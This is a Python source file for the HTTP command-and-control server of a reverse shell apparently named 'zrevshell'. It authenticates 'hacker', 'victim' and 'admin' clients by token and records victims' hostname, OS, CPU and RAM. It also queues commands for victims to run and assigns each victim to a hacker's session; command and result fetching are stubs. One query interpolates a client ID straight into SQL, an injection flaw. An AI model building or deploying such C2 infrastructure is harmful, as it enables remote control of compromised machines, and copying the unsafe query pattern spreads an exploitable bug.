""" The reverse shell server and request handler. """

# ---- imports
import sys
import reverse_shell.utils as ut
import json as js
from typing import Callable, Any
from reverse_shell.server.config import Config, get_argument_parser
from http.server import BaseHTTPRequestHandler, HTTPServer
from http import HTTPStatus, HTTPMethod
from functools import partial
from binascii import Error as b64decodeError


class ZrevshellServer(BaseHTTPRequestHandler):
    """Request handling."""

    def __init__(self, config: Config, *args, **kwargs):
        # Our configuration: tokens, ip, port and etc...
        self.config = config

        # Defining the server_command-function relation using a dict
        self.server_command_functions: dict[
            str, list[HTTPMethod | Callable[..., Any]]
        ] = {
            "post_cmd": [self.handle_cmd_post_cmd, HTTPMethod.POST],
            "verify": [self.handle_cmd_verify, HTTPMethod.POST],
            "create_session": [self.handle_cmd_create_session, HTTPMethod.POST],
            "fetch_cmd": [lambda: (False, HTTPStatus.NOT_IMPLEMENTED), HTTPMethod.GET],
            "fetch_res": [lambda: (False, HTTPStatus.NOT_IMPLEMENTED), HTTPMethod.GET],
        }

        # Initializing our parent, cuz of respect.
        super().__init__(*args, **kwargs)

    # ----------Utility methods ---------- #

    def c_send_error(self, code: HTTPStatus, message=None, explain=None):
        self.send_error(code, message, explain)
        self.end_headers()

    def check_verified_request(self):
        """Check if the request is verified by ensuring the existence and validity of auth_token
        and existence of the client-id header"""

        client_id = self.headers.get(
            "client-id"
        )  # This might be None if the client_id doesn't exist
        auth_token = self.headers.get("Authorization")  # same goes here

        # If the client_id header doesn't exist then we tell the user
        # that he is sending a bad request
        if client_id is None:
            self.c_send_error(HTTPStatus.BAD_REQUEST)
            return False

        if auth_token is not None:
            # Let's check if the auth_token matches ours
            # First let's decode the token, it might not be valid
            # base64 so we'll error handle it.
            try:
                # Remove the Basic string from the token
                auth_token = auth_token.removeprefix("Basic").strip()
                decoded_token = ut.decode_token(auth_token)
            except (b64decodeError, UnicodeDecodeError):
                pass
            else:
                if decoded_token == self.config.auth_token:
                    return True

        # Well if the user doesn't pass through the above it means the client ain't
        # verified so let's tell that to the client
        self.c_send_error(HTTPStatus.UNAUTHORIZED)
        return False

    def get_client_type(self, client_id: str):
        """Get the client type of a specified client from the database. This could also be a means to check if the client
        has verified itself."""
        # query data from the database
        cursor = self.config.session_data_db.cursor()
        usr_client_type = self.config.query_db(
            cursor, f"SELECT client_type FROM clients WHERE client_id='{client_id}'"
        )
        # Let's return None if the client is not find in the database or an error occurred
        if usr_client_type is None or len(usr_client_type) == 0:
            return None

        # if it's not let's return the client_type, by flattening out the list and tuple and
        # converting into the client_type thing.
        usr_client_type = usr_client_type[0][0]
        result = [
            client_type
            for client_type in [
                ut.ClientType.Hacker,
                ut.ClientType.Victim,
                ut.ClientType.Admin,
            ]
            if usr_client_type == client_type.__str__()
        ]
        return result[0]

    def get_header_token(self, token_name: str, fallback=None):
        """Get a header field and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist"""
        token = self.headers.get(token_name, None)

        try:
            if token is not None:
                token = ut.decode_token(token)
            return token
        except (b64decodeError, UnicodeDecodeError):
            return fallback

    def insert_victim_info_db(self, victim_id: str, json_str: str):
        """Insert victims info and specs to the victim_info database. returns None if some error happens"""
        try:
            victim_info = js.loads(json_str)
        except js.JSONDecodeError:
            # Incase if the data the user sent is not valid json
            # we are going to set victim_info to None and later on set
            # the columns to null
            victim_info = None

        if victim_info is not None:
            # Get all the info we need
            host_name = victim_info.get("host_name", None)
            os = victim_info.get("os", None)
            arch = victim_info.get("arch", None)
            cpu = victim_info.get("cpu", None)
            ram = victim_info.get("ram", None)

            # Insert that to the victims database
            return self.config.execute_on_session_db(
                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
                [victim_id, host_name, os, arch, cpu, ram],
            )
        else:
            # Well we couldn't even parse the victim info so let's just
            # insert null everywhere
            return self.config.execute_on_session_db(
                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
                [victim_id, *[None for _ in range(5)]],
            )

    def check_verified_for_cmd(self, cmd: str, client_type: int):
        """Check if a client is verified to access a server command."""
        return client_type in self.config.server_cmd_privileges.get(cmd, [])

    def get_req_body(self):
        """Decode and do everything to read from the body of the request and return the parsed response."""
        # Get the content length.
        try:
            content_length = int(self.headers.get("content-length", 0))
        except ValueError:
            # Incase the content-length header was not a number
            # use 0 as the default
            content_length = 0

        # Get the request body in bytes
        raw_data = self.rfile.read(content_length)
        # Now we expect that the data returned to be base64 encoded
        # let's try to decoded it and return None if not.
        try:
            decoded_data = ut.decode_token(raw_data.decode())
        except (UnicodeDecodeError, b64decodeError):
            decoded_data = None

        return decoded_data

    # ---------- Server command handler methods ---------- #

    def handle_cmd_verify(self, client_id: str, client_type: int, req_body: str | None):
        """Do what needs to be done if the server command sent is 'verify'."""
        # First let's check if the user is already in the database
        result = self.config.query_db(
            self.config.session_data_db.cursor(),
            "SELECT * FROM clients WHERE client_id=?",
            [client_id],
        )
        # If our result is an empty list that means the user is not there and we can
        # proceed, but if there is something in the list returned, the user already exists
        # so we are going to inform that and stop the execution
        if result is not None:
            if len(result) > 0:
                return (False, HTTPStatus.CONFLICT)
        # If our user is valid then we can maybe add him to the database
        client_insert_op = self.config.execute_on_session_db(
            "INSERT INTO clients VALUES(?, ?, 1)", [client_id, client_type]
        )
        if client_insert_op is None:
            # Some kinda SQL error happened so let's send a internal server error message
            return (False, HTTPStatus.INTERNAL_SERVER_ERROR)

        # If the client is a victim then we will require more data from the body and
        # add it to the victim_info database.
        if client_type.__str__() == ut.ClientType.Victim.__str__():
            # Let us insert the victim_info in the database after checking if the req_body isn't None
            if req_body is None:
                return (False, HTTPStatus.BAD_REQUEST)
            self.insert_victim_info_db(client_id, req_body)

        # If all is good return OK
        return (True, HTTPStatus.OK)

    def handle_cmd_post_cmd(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Do what needs to be done if the server command is 'post_cmd'"""
        # First lets assign an ID to the command we are inserting to the db
        command_id = ut.generate_token()

        # Bad request return message
        bad_request = (False, HTTPStatus.BAD_REQUEST)

        # Check if our req_body isn't None
        if req_body is None:
            return (False, HTTPStatus.BAD_REQUEST)

        try:
            # Let's try to decode this fella
            data = js.loads(req_body)
        except js.JSONDecodeError:
            # Well if we fail to decode this then we can't proceed
            # so let's return the bad_request as an indicator
            return bad_request

        victim_id = data.get("victim_id", None)
        command = data.get("command", None)

        if victim_id is None or command is None:
            return bad_request

        # Now let's check if the victim exists in the database and the user is actually a victim
        # because if the victim doesn't exist, there is no point in adding the data in the db.
        # We can use the self.get_client_type method for that
        if (
            self.get_client_type(victim_id) is None
            or self.get_client_type(victim_id) != ut.ClientType.Victim
        ):
            return bad_request

        # If we get the values then let's insert them into the database.
        result = self.config.execute_on_session_db(
            "INSERT INTO commands VALUES(?, ?, ?)", [command_id, victim_id, command]
        )

        if result is None:
            return (False, HTTPStatus.INTERNAL_SERVER_ERROR)

        # If all went good, lets once again return the OK response
        return (True, HTTPStatus.CREATED)

    def handle_cmd_create_session(
        self, client_id: str, client_type: int, req_body: str | None
    ):
        """Do what needs to be done when the command sent is 'create_session'"""
        # Keep in mind that the req_body in this case is actually the victim_id itself
        # not in json format but plain string.
        victim_id = req_body

        # if no req_body we can't do anything so let's report error
        if victim_id is None:
            return (False, HTTPStatus.BAD_REQUEST)

        # Let's check if the victim is valid by using the self.get_client_type function
        valid_victim = (
            victim_type := self.get_client_type(victim_id)
        ) is not None and victim_type == ut.ClientType.Victim

        # If the victim is invalid, send a bad request for the user
        if not valid_victim:
            return (False, HTTPStatus.BAD_REQUEST)

        if self.config.hacking_sessions.get(victim_id, None) is not None:
            # This means the victim is already in session with another hacker
            # so let's notify the hacker about it by sending a forbidden error
            return (False, HTTPStatus.FORBIDDEN)

        # If the victim is valid and not already in session with somebody else
        # let's put him in a session with the hacker.
        self.config.hacking_sessions[victim_id] = client_id

        # Finally report the OK message
        return (True, HTTPStatus.OK)

    def execute_command(
        self,
        client_id: str,
        command: str,
        handler_func,
        *args,
        client_type_from_headers: bool = False,
        **kwargs,
    ):
        """This method is in charge of handling any server command, provided the handler_function which handles the work done for the server command.
        This method will get the body of the request and validate if the client is eligible of accessing the command. The function will send responses with the client when needed either it be an error or not. the handler_function should accept the and client_id, req_body. The rest arguments and keyword arguments will be passed to the handler_func. req_body will be set to None if there is an error parsing the body.
        """
        legit_client = False

        if client_type_from_headers:
            # First get the client_type of the user and check
            # if the user claims match his tokens.

            # This is only done the first time, when verifying. after we will
            # look for the user in the database.
            client_type = self.headers.get("client-type", None)

            hacker_token = self.get_header_token("hacker-token")
            admin_token = self.get_header_token("admin-token")

            legit_user = {
                ut.ClientType.Hacker.__str__(): hacker_token is not None
                and hacker_token == self.config.hacker_token,
                ut.ClientType.Admin.__str__(): admin_token is not None
                and admin_token == self.config.admin_token,
                ut.ClientType.Victim.__str__(): True,
            }

            if client_type is not None and legit_user.get(client_type, False):
                # Let's check if the client is able to access the server command
                if self.check_verified_for_cmd(command, int(client_type)):
                    legit_client = True

        else:
            # Ok so first let's get the client-type from the database and
            # use that to check if the user can access the path it's accessing
            client_type = self.get_client_type(client_id)

            # if the client_type is None it means there is no client
            # with the client_id we gave so let's tell the user that
            # he made an unauthorized request.
            if client_type is not None and self.check_verified_for_cmd(
                command, client_type
            ):
                legit_client = True

        if not legit_client:
            # It doesn't seem we are authorized
            self.c_send_error(HTTPStatus.UNAUTHORIZED)
            return

        # Now let's get the post request body of the request according to validate_req_body function
        body = self.get_req_body()

        # Having the post request ready and having a legit client let's execute
        # the handler for the command.
        result = handler_func(
            *args, client_id=client_id, client_type=client_type, req_body=body, **kwargs
        )

        # Now we will send what the result sends, the result is expected to be
        # a tuple in a format of (result: bool, status_code: HTTPStatus) and we'll use that
        # for determining wether the result is an error or not and get the status code.
        # using our result let's now say something to the client.
        if result[0] is True:
            self.send_response(result[1])
            self.end_headers()
        else:
            self.c_send_error(result[1])

    # ---------- HTTP request method handler methods ---------- #

    def main_handler(self, method: HTTPMethod):
        """Handle requests."""

        # Check if the request is valid
        if not self.check_verified_request():
            return

        # Get the client id
        client_id = self.headers.get("client-id").__str__()

        # This is for when accessing the root path. simply send
        # an OK code with a simple html file.
        if self.path == "/":
            data = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8" />
                <meta http-equiv="X-UA-Compatible" content="IE=edge" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Thank You</title>
            </head>
            <body>
                <h2>Thanks for the visit!</h2>
            </body>
            </html>
            """.encode()

            self.send_response(HTTPStatus.OK)
            self.send_header("content-type", "text/html")
            self.send_header("content-length", f"{len(data)}")
            self.end_headers()
            self.wfile.write(data)
            return

        # the self.path is the command's id in this case
        command = self.config.server_cmds.get(self.path, None)

        if command is None:
            # The path requested doesn't match the server_cmds so tell the user that using a 404 error
            self.c_send_error(HTTPStatus.NOT_FOUND)
            return

        # Now let's check if the path(command) requested is available in this method
        handler, req_method = self.server_command_functions[command]

        if req_method != method:
            # If this path(command) is not meant for this particular
            # method, then send a 404
            self.c_send_error(HTTPStatus.NOT_FOUND)
            return

        # ---- Command execution & authorization
        self.execute_command(
            client_id,
            command,
            handler,
            client_type_from_headers=(True if command == "verify" else False),
        )

    def do_GET(self):
        """Handle the GET requests."""
        self.main_handler(HTTPMethod.GET)

    def do_POST(self):
        """Handle POST requests."""
        self.main_handler(HTTPMethod.POST)


def start_server(configuration: Config):
    """Start the HTTP server"""

    # Getting the ip and port from the config
    ip, port = configuration.ip, configuration.port

    # We are using partials because only can pass the class to
    # HTTPServer not an object so we can use functools.partial to solve
    # the issue.
    zrevshell_server = partial(ZrevshellServer, configuration)

    # Initiate the server
    ut.log("debug", f"Server is starting on ({ip}:{port})...")
    httpd = HTTPServer((ip, port), zrevshell_server)
    ut.log("success", "Server has successfully started!")
    # Means print an empty line, i think...
    print("\r")
    ut.log("info", "-------- Tokens --------")
    # If in debug mode we are going to print the server_commands and
    # the encoded version of the tokens to make debugging easier
    ut.log(
        "info",
        (
            "Authentication Token:"
            f" {configuration.auth_token}{f'  --  {ut.encode_token(configuration.auth_token)}' if configuration.is_debug else ''}"
        ),
    )
    ut.log(
        "info",
        (
            "Administration Token:"
            f" {configuration.admin_token}{f'  --  {ut.encode_token(configuration.admin_token)}' if configuration.is_debug else ''}"
        ),
    )
    ut.log(
        "info",
        (
            "Hacking Token:"
            f" {configuration.hacker_token}{f'  --  {ut.encode_token(configuration.hacker_token)}' if configuration.is_debug else ''}"
        ),
    )

    # Printing the server commands
    if configuration.is_debug:
        print("\r")
        ut.log("info", "--------- Server request endpoints --------")
        for key, val in configuration.server_cmds.items():
            ut.log("info", f"{val} -- {key}")

    # Create some empty space for the proceeding
    print("\r")
    # Create a header for the logs that the http server generates
    ut.log("info", "--------- Server Logs --------")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        # It's because we use keyboard interrupt normally to stop
        # the server.
        pass

    # Actually does nothing, but incase we override it
    # and need to clean up our server
    httpd.server_close()

    ut.log("debug", "Server has shutdown!")
    sys.exit(0)


def main():
    """Run the reverse shell server"""
    # Initializing our configuration
    parser = get_argument_parser()
    configuration = Config(parser.parse_args())

    # Let's rockin roll
    start_server(configuration)


if __name__ == "__main__":
    main()
